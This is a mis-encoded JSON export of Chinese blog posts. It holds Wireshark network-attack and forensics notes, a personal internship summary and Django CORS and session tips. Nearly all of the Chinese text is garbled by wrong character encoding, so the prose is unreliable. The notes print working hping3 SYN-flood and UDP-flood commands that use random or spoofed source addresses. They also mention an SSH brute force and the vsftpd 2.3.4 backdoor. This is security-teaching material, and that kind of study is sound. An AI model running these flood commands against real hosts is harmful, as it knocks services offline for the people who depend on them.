æ˜¯å¦å…·æœ‰IPåœ°å€å¯¹åº”çš„MACåœ°å€ï¼Œæ‰¾åˆ°å¡«å……ã€‚ ARPåè®®åˆ†æä»‹ç»æ˜¾ç¤ºè¿‡æ»¤å™¨ arp è¯·æ±‚æ•°æ®åŒ… arp.opcode == 0x0001 å“åº”æ•°æ®åŒ… arp.opcode == 0x0002 æŸ¥çœ‹æº MAC åœ°å€ arp.src.hw_mac == 00:00:00:00:00:00 arp.src.hw_mac == 00:00:00:00:00:00 &amp;&amp; arp.opcode == 0x0002 ä¸“å®¶ç³»ç»Ÿåˆ†æç½‘å…³åœ°å€ä¸å±€åŸŸç½‘ä¸­çš„è®¡ç®—æœºå…·æœ‰ä¸€è‡´çš„MACåœ°å€ å‡ºç°å¤§é‡ARPæ•°æ®åŒ…çš„åŸå›  ARPä¸»æœºæ‰«æ ARPç—…æ¯’è¿›è¡Œé€šä¿¡ ARPæ¬ºéª— ä¸­é—´äººå®‰å…¨æµ‹è¯• é˜²å¾¡ARPæ¬ºéª—æªæ–½ é™æ€ç»‘å®šARPè¡¨ arp -s ç½‘å…³çš„IPåœ°å€ ç½‘å…³çš„MACåœ°å€ ä¸é€‚åˆå¤§å‹ç½‘ç»œä½¿ç”¨ éœ€è¦ç®¡ç†å‘˜æƒé™ win netsh i i show in -&gt; æŸ¥çœ‹ç½‘å¡ç¼–å· win netsh -c &quot;i i&quot; add neighbors &lt;ç½‘å¡ç¼–å·&gt; &lt;ç½‘å…³IPåœ°å€&gt; &lt;ç½‘å…³MACåœ°å€&gt; - éªŒè¯æ˜¯å¦é™æ€ç»‘å®š `arp -a` äº¤æ¢æœºä¹Ÿæœ‰ç«¯å£å®‰å…¨é…ç½®ï¼Œå›ºå®šMACå’ŒIPä½¿ç”¨ç«¯å£ ä¸é€‚åˆå¤§å‹ç½‘ç»œä½¿ç”¨ äº¤æ¢æœº DHCP-Snooping äº¤æ¢æœºç›‘å¬DHCPæ•°æ®ï¼Œæå–IPå’ŒMACå»ºç«‹DHCP Snoopingçš„ç»‘å®šè¡¨ åˆ’åˆ†VLAN æ¯ä¸€ä¸ªVLANå°±æ˜¯ä¸€ä¸ªå¹¿æ’­åŸŸ -&gt; é™åˆ¶ç½‘ç»œèŒƒå›´ æ³ªæ»´å®‰å…¨æµ‹è¯•åŸç†ä»‹ç» é’ˆå¯¹äºIPåè®®çš„å®‰å…¨æµ‹è¯•ï¼Œä¸»è¦æ˜¯ä¼ªé€ IPåœ°å€å’Œå‘é€ç•¸å½¢æ•°æ®åŒ… å‘ç›®æ ‡å‘é€ç•¸å½¢æ•°æ®åŒ…ï¼Œä½¿å¾—IPæ•°æ®åŒ…ç¢ç‰‡åœ¨é‡ç»„çš„è¿‡ç¨‹ä¸­æœ‰é‡åˆçš„éƒ¨åˆ†ï¼ˆåç§»ä½ç½®ä¸å¤Ÿï¼‰ï¼Œä»è€Œå¯¼è‡´ç›®æ ‡ç³»ç»Ÿæ— æ³•è¿›è¡Œé‡ç»„ï¼Œè¿›ä¸€æ­¥å¯¼è‡´ç³»ç»Ÿå¥”æºƒè€Œåœæ­¢æœåŠ¡ã€‚ ä¸‹è½½IPåè®®æ¡ˆä¾‹æ•°æ®åŒ…: https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=get&amp;target=teardrop.cap æ ¹æ®æ•°æ®åŒ…è¡¨ç¤º Identification æ¥ç¡®å®æ˜¯å¦å±äºåŒä¸€åˆ†ç»„ åˆ†æ ç¬¬8å’Œç¬¬9ä¸ªæ•°æ®åŒ…åç§»é‡ä»…ä¸º 24ï¼Œè¿œä¸å¤Ÿ36ã€‚å› æ­¤æ— æ³•é‡ç»„ ä¸è¿‡å¯¹ç°åœ¨çš„è®¡ç®—æœºæ¥è¯´ï¼Œæ³ªæ»´æµ‹è¯•ä¸ä¼šå¯¹è®¡ç®—æœºé€ æˆå¾ˆå¤§çš„å½±å“ï¼Œæ‰€ä»¥åŸºæœ¬ä¸å…³å¿ƒæ³ªæ»´å®‰å…¨æµ‹è¯•äº†ã€‚ä¸å¤Ÿæ³ªæ»´æµ‹è¯•å’ŒARPæ³›æ´ªç»“åˆï¼Œè¿˜æ˜¯èƒ½å¯¹è®¡ç®—æœºé€ æˆå¾ˆå¤§çš„å›°æ‰°ã€‚ ä¼ è¾“å±‚å®‰å…¨ä¼ è¾“å±‚ä¸»è¦é’ˆå¯¹TCPå’ŒUDPåè®®ï¼Œå› æ­¤æ‹’ç»æœåŠ¡DOSï¼ˆDenial of Serviceï¼‰ä¹Ÿä¸»è¦æ˜¯åŸºäºè¿™ä¸¤ä¸ªåè®® TCP SYN æ³›æ´ªTCPè¿æ¥ä»‹ç» å®¢æˆ·ç«¯å‘é€SYNåˆ°æœåŠ¡å™¨ æœåŠ¡å™¨å“åº” SYN+ACK åˆ°å®¢æˆ·æœº å®¢æˆ·æœºå‘é€ACKåˆ°æœåŠ¡å™¨ ä½¿ç”¨ wireshark åˆ†æ TCP ä¸‰æ¬¡æ¡æ‰‹æ•°æ®åŒ… TCP SYN flooding å®‰å…¨æµ‹è¯•åŸç† å®¢æˆ·ç«¯å‘é€synæœåŠ¡ç«¯è¿”å›syn+ackï¼Œå¦‚æœå®¢æˆ·ç«¯ä¸å†å‘é€ackï¼Œé‚£ä¹ˆæœåŠ¡ç«¯å°†ç­‰å¾…è¶…æ—¶ï¼Œé‡æ–°å‘é€syn+ackã€‚å¦‚æœæ˜¯å¤§é‡çš„ç­‰å¾…ï¼Œå°±å¯èƒ½å¯¼è‡´æœåŠ¡å™¨å¥”æºƒã€‚ æ¡ˆä¾‹æ¼”ç¤º 1hping3 -q -n --rand-source -S -p 80 --flood &lt;ç›®æ ‡IPåœ°å€&gt; -q: å®‰é™æ¨¡å¼ -n: æ•°å­—åŒ–è¾“å‡ºï¼Œè±¡å¾æ€§è¾“å‡ºä¸»æœºåœ°å€ â€“rand-source: éšæœºæºIP -S: å‘é€SYNæ•°æ®åŒ… -p: æŒ‡å‘ç«¯å£ â€“flood: ä½¿ç”¨æ³›æ´ª ä¸ºäº†ä¾¿äºåˆ†æã€‚æ‰“å¼€ Statistics -&gt; Flow Graphå…ˆé€‰æ‹©æµç±»å‹ä¸ºTCPå‘ç°å®¢æˆ·ç«¯å‘é€synæœåŠ¡ç«¯è¿”å›syn+ackï¼Œä½†å®¢æˆ·ç«¯ä¸å†å‘é€ackï¼Œå¯¼è‡´èµ„æºæ¶ˆè€—ã€‚ TCP SYN floodingå®‰å…¨é˜²å¾¡ ä¸¢å¼ƒç¬¬ä¸€ä¸ªSYNæ•°æ®åŒ… -&gt; ç”¨æˆ·ä½“éªŒå·® åå‘æ¢æµ‹ -&gt; å‘æºåœ°å€æ–¹å‘å‘é€æ¢æµ‹åŒ…ï¼Œç¡®å®šæºåœ°å€åˆæ³•æ€§ ä»£ç†æ¨¡å¼ -&gt; é˜²ç«å¢™ä»£ç† -&gt; å³å…ˆä¸é˜²ç«å¢™å»ºç«‹tcpè¿æ¥ UDP æ³›æ´ªéè¿æ¥çŠ¶æ€çš„åè®®ï¼Œç®€æ´åè®®ï¼Œæ§åˆ¶é€‰é¡¹å°‘ï¼Œä¸å¯é ï¼Œä¼ è¾“é€Ÿç‡é«˜ï¼Œé€‚åˆå¤§æ–‡ä»¶ä¼ è¾“ UDPåè®®å…³é”®ç‚¹ æºç«¯å£ ç›®çš„ç«¯å£ UDPæŠ¥æ–‡é•¿åº¦ æ£€éªŒç  UDP flooding å®‰å…¨æµ‹è¯•åŸç†: æµ‹è¯•äººå‘˜å‘ç›®æ ‡å‘é€å¤§é‡å·¨å¤§çš„UDPæ•°æ®åŒ…ï¼Œå°±ä¼šä½¿ç½‘ç»œèµ„æºè¢«è€—å°½ 1sudo hping3 -q -n -a &lt;fake_ip&gt; --udp -s 53 -p &lt;dst_port&gt; --flood &lt;target_ip&gt; -d 1000 -a: ä¼ªé€ çš„ ip-s: 53ç«¯å£ UDP flooding å®‰å…¨é˜²å¾¡é˜²ç«å¢™ é™æµ: å°†é“¾è·¯ä¸­çš„UDPæŠ¥æ–‡æ§åˆ¶åœ¨åˆç†çš„èŒƒå›´ï¼Œå½“è¶…è¿‡æŒ‡å®šå€¼ï¼Œåˆ™ä¸¢å¼ƒUDPæŠ¥æ–‡ æŒ‡çº¹å­¦ä¹ : å…ˆå­¦ä¹ ï¼Œåœ¨åŒ¹é… ç½‘ç»œå–è¯ç®€æwireshark æ¢å¤ä¼ è¾“æ–‡ä»¶æ— è®ºä½¿ç”¨ä½•ç§åº”ç”¨å±‚åè®®ï¼Œå¯¹äºä¼ è¾“å±‚æ¥è¯´éƒ½æ˜¯TCPæˆ–UDPåè®®ï¼Œæ¥æ¢å¤ä¸€ä¸‹wiresharkå®˜ç½‘æä¾›çš„æ–‡ä»¶https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=view&amp;target=http_with_jpegs.cap.gzhttp_with_jpegs.cap.gz é¦–å…ˆåœ¨æ˜¾ç¤ºè¿‡æ»¤å™¨ä¸­ç­›é€‰å…·æœ‰jpegå†…å®¹çš„æ•°æ®åŒ…: http contains &quot;jpeg&quot;é€‰ç¬¬ä¸€ä¸ªï¼Œè¿½è¸ªtcpæµæœ€åç‚¹ä¸€ä¸‹ Save asâ€¦ ä¿å­˜ä¸º xxx.bin å°±å¥½ï¼Œç„¶åç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼ŒJPEGçš„æ–‡ä»¶å¼€å§‹å­—èŠ‚ä¸º FF D8ï¼Œæ–‡ä»¶ç»“æŸå­—èŠ‚ä¸º FF D9ç„¶åæŠŠå…¶ä½™æ²¡ç”¨çš„éƒ½åˆ é™¤æ‰ï¼Œè¿™é‡Œå› ä¸ºç»“æŸç¬¦å·å°±æ˜¯æœ€åäº†ï¼Œå› æ­¤æŠŠä¸Šå›¾ FF D8 ä¹‹å‰çš„éƒ½åˆ é™¤æ‰å°±å¥½äº†ã€‚æˆåŠŸæ¢å¤ã€‚ å–è¯å®è·µæ¡ˆä¾‹https://forensicscontest.com/2009/09/25/puzzle-1-anns-bad-aimå¥½åƒæ²¡äº†ã€‚ã€‚ã€‚ç„¶ååœ¨Githubæ‰¾äº†ä¸ª: https://github.com/aarud/Pcaps/blob/master/evidence01.pcap 1.å¯»æ‰¾Annçš„é€šä¿¡å¥½å‹åç§°æ ¹æ®é¢˜ç›®åç§°æç¤º aim é€šä¿¡ï¼Œwireshark è‡ªå¸¦ aim è§£å¯†è¿™ä¸‰é¡¹ä¾æ¬¡æ”¹ä¸ºç„¶åæŸ¥çœ‹æ•°æ®åŒ…ï¼Œå‘ç°é€šä¿¡å¥½å‹åç§°æ˜¯ Sec558user1 2. é€šä¿¡è¿‡ç¨‹ä¸­çš„ç¬¬ä¸€æ¡ä¿¡æ¯å†…å®¹æ˜¯ä»€ä¹ˆ 3. Ann é€šä¿¡è¿‡ç¨‹ä¸­ä¼ è¾“çš„æ–‡ä»¶åå­—æ˜¾ç¤ºè¿‡æ»¤å™¨è¾“å…¥ dataï¼Œç„¶åè¿½è¸ªtcpæµæ–‡ä»¶åå­— 4. è¿˜åŸAnnå‘é€æ–‡ä»¶å¹¶å¾—å‡ºæ–‡ä»¶å¹»æ•°ï¼ˆmagic numberï¼‰æ–‡ä»¶å¹»æ•°ä»‹ç»: https://baike.baidu.com/item/magic%20numberè¯´ç›´ç™½ç‚¹å°±æ˜¯ä»¥ zip ä¹‹çˆ¶çš„é¦–å­—æ¯PKæ¥å‘½åï¼Œå¯¹åº”çš„16è¿›åˆ¶æ˜¯50 4B 03 0450(P)4B(K)03(æ–‡æœ¬ç»“æŸ)04(ä¼ è¾“ç»“æŸ)ï¼Œç»„åˆèµ·æ¥å°±æ˜¯å‹ç¼©åŒ…çš„æ ‡è¯†å¼€å¤´ã€‚é‚£ä¸ºå•¥wordæ–‡æ¡£çš„æ–‡ä»¶å¼€å¤´æ˜¯è¿™ä¸ªï¼ŒæŠŠwordæ–‡æ¡£åç¼€æ”¹ä¸º.zipè¯•è¯•ï¼Œè¿™æ˜¯å¾®è½¯2006å¹´å…¬å¸ƒçš„OOXMLè§„èŒƒã€‚ æ˜¾ç¤ºè¿‡æ»¤å™¨è¾“å…¥ dataï¼Œç„¶åè¿½è¸ªtcpæµå¦å­˜ä¸ºï¼Œxxx.binï¼Œç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€xxx.bin 5. æŸ¥çœ‹æ–‡ä»¶md5å€¼ åº”ç”¨å±‚ç½‘ç»œå®‰å…¨æš´åŠ›ç ´è§£åˆ†æåˆ†æä½¿ç”¨ medusa ç ´è§£ ssh ç™»å½• åé—¨åˆ†ææŸäº›è½¯ä»¶å…·æœ‰å…¶ä»–çš„ç›®çš„ -&gt; è®¾ç½®éšè—åé—¨è¿™é‡Œé’ˆå¯¹vsftpd 2.3.4 åé—¨å¸å·å¯†ç ä¸è¦ç´§ï¼Œæœ‰ :) ç¬‘è„¸å°±è¡Œï¼Œå› æ­¤è¿™ä¸ªåé—¨ä¹Ÿè¢«ç§°ä¸ºç¬‘è„¸åé—¨ï¼Œ2333","categories":[{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"æµé‡åˆ†æ/Wireshark","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/"},{"name":"MISC","slug":"æµé‡åˆ†æ/Wireshark/MISC","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/MISC/"}],"tags":[{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"https://tari.moe/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"Wireshark","permalink":"https://tari.moe/tags/Wireshark/"},{"name":"MISC","slug":"MISC","permalink":"https://tari.moe/tags/MISC/"}]},{"title":"=======æ€»ç»“ & æ‰‹åŠ¨åˆ†å‰²çº¿=======","slug":"æ‰‹åŠ¨åˆ†å‰²çº¿","date":"2021-04-01T10:40:39.000Z","updated":"2021-04-02T02:14:59.492Z","comments":true,"path":"2021/04/01/æ‰‹åŠ¨åˆ†å‰²çº¿/","link":"","permalink":"https://tari.moe/2021/04/01/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/","excerpt":"","text":"ç”±äº notion å’Œ è¯­é›€ ä½¿ç”¨èµ·æ¥è¿‡äºèˆ’é€‚ï¼Œå·®ç‚¹å¿˜äº†è‡ªå·±è¿˜æœ‰ä¸ªåšå®¢ï¼Œç›´åˆ° ï¼ˆé€ƒ ä¸Šæ¬¡å†™åšå®¢è¿˜æ˜¯å¤§ä¸‰ä¸Šå­¦æœŸæœ«ï¼Œç°åœ¨éƒ½å·®ä¸å¤šè¦æ¯•ä¸šäº†ã€‚å¤§äºŒå¤§ä¸‰é‚£ä¼šï¼Œåœ¨å­¦æ ¡å•¥éƒ½å¹²ï¼Œä»ä¹‹å‰çš„æ–‡ç« ä¹Ÿèƒ½çœ‹å‡ºï¼ŒæœåŠ¡å™¨è¿ç»´ã€å¼€å‘ã€CTFâ€¦. é¡ºä¾¿åšä¸ªæ€»ç»“ï¼Œè¿™ä¸€å¹´è™½æ²¡å†™åšå®¢ï¼Œä¸è¿‡æ‰¾äº†ä¸¤ä»½å®ä¹ ï¼Œä¸€ä¸ªæ˜¯åšæ¸—é€æµ‹è¯•ã€ä¸€ä¸ªæ˜¯å®‰å…¨æ”»é˜²ç ”ç©¶ï¼Œè¿˜æœ‰å­¦æ ¡å„ç§å„æ ·çš„äº‹æƒ…ï¼Œå¥½åƒä¸Šæ¬¡è·‘ hexo d è¿˜æ˜¯ä¸ä¹…ä¹‹å‰ï¼ˆä¸»è¦æ˜¯è¢« notion å’Œ è¯­é›€ æƒ¯æ‡’äº†ï¼‰â€¦ 2020.4 - 2020.10 æ¸—é€æµ‹è¯•å®ä¹ ç”Ÿï¼Œç®—æ˜¯æ­£å¼å…¥é—¨ç½‘å®‰å§â€¦æ„Ÿè°¢ç»„å†…å¤§ä½¬è‚¯æ”¶ç•™æˆ‘ä¸ªèœé¸¡ï¼Œå“ˆå“ˆï¼Œä¸€å¼€å§‹è¿˜å¾ˆçº ç»“ï¼Œä»¥åæ˜¯åšå®‰å…¨è¿˜æ˜¯è¿ç»´ï¼Œæ‰€ä»¥å„æŠ•äº†ä¸€ä»½å®ä¹ ï¼ˆåˆšè¿‡å®Œå¹´åšå¸ˆå…„çš„ç–¯ç‹‚å®‰åˆ©ä¸‹ï¼‰ï¼Œé¢è¯•å’Œå‡†å¤‡ï¼Œå‘ç°è¿˜æ˜¯å¯¹ç½‘å®‰æ›´æ•¢å…´è¶£ä¸€äº›~ï¼Œæ‰€ä»¥é€‰äº†ç½‘å®‰ã€‚ä¸è¿‡ç°åœ¨å¶å°”ä¼šæƒ³ï¼Œè¦æ˜¯å½“åˆæˆ‘é€‰äº†å¦å¤–ä¸€ä¸ªå®ä¹ ï¼Œç°åœ¨ä¼šæ€æ ·ï¼Ÿï¼ˆæ¯•ç«Ÿä¸¤è¾¹é¢è¯•éƒ½è¿‡äº†ï¼‰ï¼Œå®ä¹ è¿‡ç¨‹ä¸­è¢«å„ç§å¸¦é£ï¼Œè®¤è¯†äº†å‡ ä¸ªå¤§ä½¬ï¼Œå…¶ä¸­çš„é¡¹ç›®ç»éªŒï¼Œéƒ½ç»™ç§‹æ‹›æ‰“ä¸‹äº†åŸºç¡€ã€‚ 2020.10 - 2020.12 å­¦æ ¡é¡¹ç›®ï¼Œæ¨¡ä»¿å¤§ä½¬çš„å¼€æºé¡¹ç›®ï¼Œç»“åˆæ·±åº¦å­¦ä¹ å’Œç½‘å®‰å’ŒåŒå­¦ä¸€èµ·åšäº†ä¸ªã€ŠåŸºäºA2Cå’ŒMSFçš„è‡ªé€‚åº”æ¸—é€æµ‹è¯•å·¥å…·ã€‹ï¼Œä½œä¸ºä»£ç å’Œæ–‡æ¡£çš„ä¸»è¦è´¡çŒ®è€…ï¼Œè™½ç„¶æ²¡åšåˆ°æƒ³è±¡ä¸­æ•ˆæœï¼Œä¸è¿‡ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å°è¯•å»å­¦ä¹ å’Œæ”¹åŠ¨å¤§ä½¬çš„å¼€æºé¡¹ç›®ã€‚è™½ç„¶åŠŸèƒ½ä¸Šæ²¡èƒ½åšçš„å¾ˆå¥½ï¼ˆä¸è¿‡è¿˜æ˜¯åšäº†è®¸å¤šçš„ä¸é”™çš„ä¼˜åŒ–ï¼‰ï¼Œä½†æ˜¯ä»¥åå¯¹å¼€æºé¡¹ç›®éƒ½ä¸ä¼šæœ‰é‚£ç§é™Œç”Ÿçš„éš”ç¦»æ„Ÿäº†ï¼ˆå°±è¿™ä¸ªè¯­è¨€å­¦è¿‡ï¼Œä¹Ÿå†™è¿‡é¡¹ç›®ï¼Œä½†çœ‹ç€å¤§ä½¬å†™çš„å°±æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼‰ 2020.11 - 2021.3 å®‰å…¨æ”»é˜²ç ”ç©¶å®ä¹ ç”Ÿï¼Œç¬¬ä¸€æ¬¡åœ¨å¤§å‹é¡¹ç›®ä¸­æŠ€æœ¯ä¸Šæ‰¿æ‹…ä¸€å®šè§’è‰²ï¼ŒæŒ‘æˆ˜å¾ˆå¤§ï¼Œè¿‡äº†ä¸€ä¸ªæœˆæ‰ä¹ æƒ¯è¿™äº›å·¥ä½œï¼Œä¹‹å‰å®ä¹ ä¸»è¦æ˜¯æ¸—é€ï¼Œè¿™æ¬¡è¿˜æœ‰å¾ˆå¤šä»£ç å®¡è®¡ã€å°¤å…¶æ˜¯hvvç›¸å…³çš„ï¼Œä»£ç å®¡è®¡ä»»åŠ¡å¾ˆç¹é‡ï¼Œå¹³å‡ä¸€å¤©è¦å®¡ä¸ª6000+è¡Œä»£ç ï¼ˆè€Œä¸”è¿˜æ˜¯å„ç§è¯­è¨€ï¼Œæœ‰çš„å‹æ ¹å°±ä¸æ€ä¹ˆç†Ÿæ‚‰â€¦ï¼‰ã€‚ä¹Ÿåšäº†å¾ˆå¤šå°è¯•ï¼Œæ¯”å¦‚å¨èƒå»ºæ¨¡è¯„å®¡ï¼Œå®‰å…¨çº¢çº¿è½å®ç­‰ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦SDLï¼Œä¹Ÿç”±æ­¤çŸ¥é“ä¸ºå•¥å¤§å‚æ ¸å¿ƒä¸šåŠ¡æ¼æ´ä¼šéš¾æŒ–ï¼Œæ¯•ç«Ÿåˆ«äººéƒ½æœ‰åšSDLæµç¨‹ã€‚å½“ç„¶é™¤æ­¤ä¹‹å¤–ï¼Œç”±äºæˆ‘ä»¬éƒ¨é—¨å¾ˆçœ‹é‡äº§å‡ºï¼Œæ‰€ä»¥è¿™æ¬¡å®ä¹ ä¹Ÿæ²¡ä¸Šæ¬¡å®ä¹ é‚£ä¹ˆè½»æ¾ã€‚ç‰¹åˆ«æ˜¯æˆ‘è¿™ä¸ªäº§å“çº¿ï¼Œè¿­ä»£äº†å¾ˆå¤šä»£ï¼Œæ¼æ´ç‰¹åˆ«éš¾æŒ–ï¼Œè€Œä¸”æ¸—é€ä¹Ÿæ¯”è¾ƒéº»çƒ¦ï¼Œå› ä¸ºç¯å¢ƒæ¯”è¾ƒå¤æ‚ï¼Œæ²¡æœ‰åœ¨æç«™é‚£ä¼šéšéšä¾¿ä¾¿æŠ“ä¸ªåŒ…æ”¹æ”¹å‚æ•°é‚£ä¹ˆèˆ’æœäº†~ å½“ç„¶äº§å‡ºä¸ä»…ä»…æ˜¯æŒ–æ´ï¼Œè¿˜å¯ä»¥æœ‰å®‰å…¨ç ”ç©¶åˆ†äº«ï¼Œè¾“å‡ºæ–‡æ¡£ç­‰ç­‰ç­‰ç­‰~ æ€»ä¹‹å°±æ˜¯ä»ä¹‹å‰å„ç§æ‰“æ‚åˆ°ç°åœ¨ä¼šç¨å¾®ä¸“æ³¨äºä¸€ä¸ªæ–¹å‘ï¼Œæ‰€ä»¥æˆé•¿ä¹ŸæŒºå¿«çš„ï¼Œè™½ç„¶è¿˜æ˜¯å¾ˆèœï¼ˆxï¼Œå…¶å®ä¸»è¦è¿˜æ˜¯è¢«å„ç§å¤§ä½¬å¸¦é£ï¼Œå°‘èµ°äº†ä¸€äº›å‘ ï¼ˆ ä»Šå¹´ï¼Œè™½ç„¶è¿‡å¹´å¾ˆä¹…äº†ï¼Œå…ˆç«‹ä¸€äº› flag å§~ï¼Œæ¯•ç«Ÿå®ä¹ äº†ä¸¤æ¬¡ï¼Œå‘ç°ä¸€äº›ä¸œè¥¿éœ€è¦è¡¥è¡¥äº† SDLï¼ŒæŠŠå®ä¹ å­¦çš„åšä¸ªæ€»ç»“å¹¶åšä¸€äº›æ‹“å±• äº‘å®‰å…¨ï¼Œå…ˆæŠŠå¨èƒå»ºæ¨¡å­¦ä¸ªå·®ä¸å¤šï¼Œç„¶åç†Ÿæ‚‰ä¸€æ³¢ä¸»æµçš„äº‘åŸºç¡€æ¡†æ¶ï¼Œæ¯•ç«Ÿå·¥ä½œè¦ç”¨åˆ° äºŒè¿›åˆ¶ï¼Œå¸¸è§æ¼æ´ç‚¹å’Œåˆ©ç”¨æ–¹å¼è¦æŒæ¡ï¼Œæ„Ÿè§‰ç†Ÿæ‚‰äºŒè¿›åˆ¶ä»¥åå®¡è®¡C/C++ä¼šèˆ’æœä¸å°‘ ä»£ç å®¡è®¡ï¼ŒæŠŠç™½å«–è¿‡æ¥çš„CTFSHOWå…¥é—¨å¤§éƒ¨åˆ†ç»™åˆ·å®Œï¼Œå·©å›ºä¸€æ³¢åŸºç¡€~ è¿Ÿäº›ä¼šæŠŠä¸€äº›æ­£å¸¸ç‚¹çš„ç¬”è®°æ”¾ä¸Šæ¥ï¼Œ2333","categories":[{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/"},{"name":"å°è®°","slug":"æ€»ç»“/å°è®°","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"å°è®°","slug":"å°è®°","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"},{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://tari.moe/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"djangoè¸©å‘è®°","slug":"djangoè¸©å‘è®°","date":"2020-01-02T00:50:23.000Z","updated":"2021-04-02T02:16:10.324Z","comments":true,"path":"2020/01/02/djangoè¸©å‘è®°/","link":"","permalink":"https://tari.moe/2020/01/02/django%E8%B8%A9%E5%9D%91%E8%AE%B0/","excerpt":"","text":"python è™šæ‹Ÿç¯å¢ƒpip install virtualenvpip install virtualenvwrapper-win # windows ä½¿ç”¨æ­¤å‘½ä»¤ å¥½å¤„,ï¼šå¯ä»¥ä¸€ä¸ªç¯å¢ƒå¯¹åº”ä¸€ä¸ªé¡¹ç›® é—­åŒ…ä¸€ç›´å¥½å¥‡é—­åŒ…æœ‰ä»€ä¹ˆç”¨ï¼Œç›´åˆ°å­¦äº† django åçš„ç™»å½•è£…é¥°å™¨ é—­åŒ…çš„åº”ç”¨ï¼šè£…é¥°å™¨ã€é¢å‘å¯¹è±¡ 1234567891011121314151617181920&quot;&quot;&quot;è£…é¥°å™¨çš„åº”ç”¨å¦‚æœéœ€è¦ç»Ÿè®¡ä¸€ä¸ªå‡½æ•°è¿è¡Œçš„æ—¶é—´ï¼ŒåŠ ä¸Šè£…é¥°å™¨å³å¯ï¼Œå¯ç®€åŒ–ä»£ç &quot;&quot;&quot; import timedef func_timer(func): def wrapper(): start_time = time.time() func() print(time.time() - start_time) return wrapper@func_timerdef login(): print(&#x27;login success!&#x27;)login() è·¨åŸŸé—®é¢˜åœ¨ä¸ setting.py åŒçº§ç›®å½•æ–°å»ºä¸€ä¸ª py æ–‡ä»¶ã€‚å†™å…¥å¦‚ä¸‹ä»£ç  123456789from django.utils.deprecation import MiddlewareMixinclass SolveCrossDomainMiddleware(MiddlewareMixin): def process_response(self, request, response): response[&quot;Access-Control-Allow-Credentials&quot;] = &quot;true&quot; response[&quot;Access-Control-Allow-Origin&quot;] = &quot;http://192.168.123.60:8080&quot; response[&quot;Access-Control-Allow-Methods&quot;] = [&quot;GET&quot;, &quot;POST&quot;] return response å¦‚ä¸‹å›¾æ‰€ç¤º åœ¨ settingpy çš„ MIDDLEWARE å¼•å…¥ï¼Œ webproject ä¸è‡ªå·±çš„é¡¹ç›®åå­—å¯¹åº”ï¼Œ 1&#x27;webproject.solveCrossDomain.SolveCrossDomainMiddleware&#x27;, å¦‚ä¸‹å›¾æ‰€ç¤º å³å¯è§£å†³è·¨åŸŸé—®é¢˜ï¼Œå› ä¸º SolveCrossDomainMiddleware ä¸­å·²ç»å¯¹ request å’Œ response åšäº†å¤„ç†äº† session è·¨åŸŸé—®é¢˜å› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯ Vue.js + django å‰åç«¯åˆ†ç¦»ï¼Œå› æ­¤éœ€è¦è§£å†³ session è·¨åŸŸé—®é¢˜ Vue é‡ŒåŠ å…¥ (å› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯ axios1this.$axios.defaults.withCredentials = true å¦‚ä¸‹å›¾æ‰€ç¤º ä»¥ä¸‹ä¸º django é‡Œçš„æ“ä½œæˆ‘ä½¿ç”¨çš„æ˜¯ æ•°æ®åº“å­˜å‚¨ sessionï¼Œ å› æ­¤ setting.py å¼•å…¥çš„æ˜¯ 123456789101112131415161718MIDDLEWARE = [...&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,...]SESSION_ENGINE = &#x27;django.contrib.sessions.backends.db&#x27; # å¼•æ“ï¼ˆé»˜è®¤ï¼‰SESSION_COOKIE_NAME = &quot;sessionid&quot; # Sessionçš„cookieä¿å­˜åœ¨æµè§ˆå™¨ä¸Šæ—¶çš„keyï¼Œå³ï¼šsessionidï¼éšæœºå­—ç¬¦ä¸²ï¼ˆé»˜è®¤ï¼‰SESSION_COOKIE_PATH = &quot;/&quot; # Sessionçš„cookieä¿å­˜çš„è·¯å¾„ï¼ˆé»˜è®¤ï¼‰SESSION_COOKIE_DOMAIN = None # Sessionçš„cookieä¿å­˜çš„åŸŸåï¼ˆé»˜è®¤ï¼‰SESSION_COOKIE_SECURE = False # æ˜¯å¦Httpsä¼ è¾“cookieï¼ˆé»˜è®¤ï¼‰SESSION_COOKIE_HTTPONLY = True # æ˜¯å¦Sessionçš„cookieåªæ”¯æŒhttpä¼ è¾“ï¼ˆé»˜è®¤ï¼‰SESSION_COOKIE_AGE = 3600 # Sessionçš„cookieå¤±æ•ˆæ—¥æœŸï¼ˆé»˜è®¤2å‘¨ï¼‰SESSION_EXPIRE_AT_BROWSER_CLOSE = False # æ˜¯å¦å…³é—­æµè§ˆå™¨ä½¿å¾—Sessionè¿‡æœŸï¼ˆé»˜è®¤ï¼‰SESSION_SAVE_EVERY_REQUEST = False # æ˜¯å¦æ¯æ¬¡è¯·æ±‚éƒ½ä¿å­˜Sessionï¼Œé»˜è®¤ä¿®æ”¹ä¹‹åæ‰ä¿å­˜ï¼ˆé»˜è®¤ï¼‰# !!! è¿™ä¸ªä¸€å®šè¦åŠ .....SESSION_COOKIE_SAMESITE = None # é»˜è®¤ä¸º Lax, å³ get å¯è·¨åŸŸ, è€Œ post ä¸å¯ä»¥ 